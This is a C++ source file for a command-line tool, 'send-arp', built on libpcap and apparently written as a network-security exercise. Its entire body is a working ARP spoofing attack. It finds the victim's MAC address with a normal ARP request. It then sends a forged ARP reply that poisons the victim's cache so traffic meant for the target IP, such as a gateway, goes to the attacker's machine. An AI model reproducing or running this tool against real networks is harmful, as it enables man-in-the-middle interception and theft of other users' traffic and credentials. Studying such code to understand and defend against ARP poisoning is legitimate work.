#include <cstdio>
#include <pcap.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <unistd.h>
#include <netinet/in.h>
#include <cstring>
#include "protocol-hdr.h"

#pragma pack(push, 1)
struct Eth_ARP {
	Ethernet eth;
	ARP arp;
};
#pragma pack(pop)

void usage();
void get_my_mac_addr(const char *dev, char *uc_Mac);
void get_my_ipv4_addr(const char *dev, char *uc_IP);


int main(int argc, char* argv[]) {
	// check syntax
	if (argc != 4) {
		usage();
		return -1;
	}

	//// declare arguments
	char* dev = argv[1];
	IPv4Addr sender_ip;
	IPv4Addr target_ip;
	
	// check && set IP addresses
	if (sender_ip.set_ipv4_addr(argv[2]) != 0
	 || target_ip.set_ipv4_addr(argv[3]) != 0) {
		return -1;
	}
	
	// open my network interface
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "Error: could not open device %s. (%s)\n", dev, errbuf);
		return -1;
	}
	
	//// set normal ARP request packet
	//// (MUST SET NETWORK BYTE ORDER)
	Eth_ARP packet;
	char my_mac[18] = "";
	char my_ip[16] = "";
	// get attacker's(my) address
	get_my_mac_addr(dev, my_mac);
	get_my_ipv4_addr(dev, my_ip);
	
	// eth settings
	packet.eth.dst_mac_addr.set_mac_addr("ff:ff:ff:ff:ff:ff");
	packet.eth.src_mac_addr.set_mac_addr(my_mac);
	packet.eth.eth_type = htons(ETH_TYPE_ARP);
	
	// arp settings
	packet.arp.htype = htons(ARP_HTYPE_ETH);
	packet.arp.ptype = htons(ARP_PTYPE_IPv4);
	packet.arp.hlen = MAC_ADDR_SIZE;
	packet.arp.plen = IPv4_ADDR_SIZE;
	packet.arp.op = htons(ARP_OP_REQUEST);
	packet.arp.sender_hw_addr.set_mac_addr(my_mac);
	packet.arp.sender_pr_addr.set_ipv4_addr(my_ip);
	packet.arp.target_hw_addr.set_mac_addr("00:00:00:00:00:00");
	packet.arp.target_pr_addr.ip = sender_ip.ip;

	//// send normal ARP request packet to check sender MAC address
	int res = pcap_sendpacket(handle, (const u_char *)&packet, sizeof(Eth_ARP));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	} else {
		printf("Sent ARP request packet to the sender. \nGetting ARP reply packet... ");
	}
	
	//// get normal ARP reply packet
	MacAddr sender_mac;
	
	/* capturing on loop */
	while (true) {
		/** variables
		 * header: packet header
		 * packet: packet content
		 * res: result code of pcap reading
		 */
		struct pcap_pkthdr* header;
		const uint8_t* packet;
		res = pcap_next_ex(handle, &header, &packet);

		if (res == 0) continue;        // not captured
		if (res == -1 || res == -2) {  // quit
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		// printf(" ** %u bytes captured ** \n", header->caplen);

		/* adjust the packet with Ethernet protocol */
		Ethernet *ethernet = (Ethernet*) packet;

		/* check if EtherType is ARP or not */
		if (ntohs(ethernet->eth_type) != ETH_TYPE_ARP) {
			// printf("Info: this packet is not ARP (EtherType == 0x%x)\n\n", ethernet->eth_type);
			continue;
		}

		/* adjust the packet with ARP protocol */
		ARP *arp = (ARP*) (packet + ETH_HEADER_LEN);

		/* ARP type check: Eth - IPv4 / Reply */
		if (ntohs(arp->htype) != ARP_HTYPE_ETH
		 || ntohs(arp->ptype) != ARP_PTYPE_IPv4
		 || ntohs(arp->op) != ARP_OP_REPLY)
		{
			// printf("Info: this packet is not Eth - ARP(IPv4) reply.\n\n");
			continue;
		}
		
		/* ARP address check: received from sender
		 * & get sender MAC address */
		if (arp->target_hw_addr == my_mac
		 && arp->target_pr_addr == my_ip
		 && arp->sender_pr_addr == sender_ip)
		{
			printf("Found!\n");
			sender_mac = arp->sender_hw_addr;
			break;
		}
	}
	
	//// Send ARP spoofing packet
	// eth settings
	packet.eth.dst_mac_addr.set_mac_addr(sender_mac);
	packet.eth.src_mac_addr.set_mac_addr(my_mac);
	packet.eth.eth_type = htons(ETH_TYPE_ARP);
	
	// arp settings
	packet.arp.htype = htons(ARP_HTYPE_ETH);
	packet.arp.ptype = htons(ARP_PTYPE_IPv4);
	packet.arp.hlen = MAC_ADDR_SIZE;
	packet.arp.plen = IPv4_ADDR_SIZE;
	packet.arp.op = htons(ARP_OP_REPLY);
	packet.arp.sender_hw_addr.set_mac_addr(my_mac);
	packet.arp.sender_pr_addr.set_ipv4_addr(target_ip);
	packet.arp.target_hw_addr.set_mac_addr(sender_mac);
	packet.arp.target_pr_addr.ip = sender_ip.ip;

	//// send ARP spoofing packet to sender
	res = pcap_sendpacket(handle, (const u_char *)&packet, sizeof(Eth_ARP));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	} else {
		printf("Sent ARP spoofing packet to the sender.\n");
	}

	pcap_close(handle);
}



void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void get_my_mac_addr(const char *dev, char *uc_Mac) {
	/* Get My MAC Address
	 * reference: https://www.includehelp.com/cpp-programs/get-mac-address-of-linux-based-network-device.aspx
	*/
	int fd;
	struct ifreq ifr;
	char *mac;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char *)ifr.ifr_name, dev, IFNAMSIZ-1);
	
	ioctl(fd, SIOCGIFHWADDR, &ifr);
	
	close(fd);
	
	mac = (char *)ifr.ifr_hwaddr.sa_data;
	
	sprintf(uc_Mac, "%02x:%02x:%02x:%02x:%02x:%02x",
		mac[0]&0xff, mac[1]&0xff, mac[2]&0xff,
		mac[3]&0xff, mac[4]&0xff, mac[5]&0xff);
}

void get_my_ipv4_addr(const char *dev, char *uc_IP) {
	/* Get My IP Address
	 * reference: https://stackoverflow.com/questions/2283494/get-ip-address-of-an-interface-on-linux
	*/
	int fd;
	struct ifreq ifr;
	uint32_t ip;
	
	fd = socket(AF_INET, SOCK_DGRAM, 0);
	
	ifr.ifr_addr.sa_family = AF_INET;
	strncpy((char *)ifr.ifr_name, dev, IFNAMSIZ-1);
	
	ioctl(fd, SIOCGIFADDR, &ifr);
	
	close(fd);
	
	ip = (((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr).s_addr;
	ip = ntohl(ip);
	
	sprintf(uc_IP, "%d.%d.%d.%d",
		(ip & 0xFF000000) >> 24,
		(ip & 0x00FF0000) >> 16,
		(ip & 0x0000FF00) >> 8,
		(ip & 0x000000FF)
	);
}
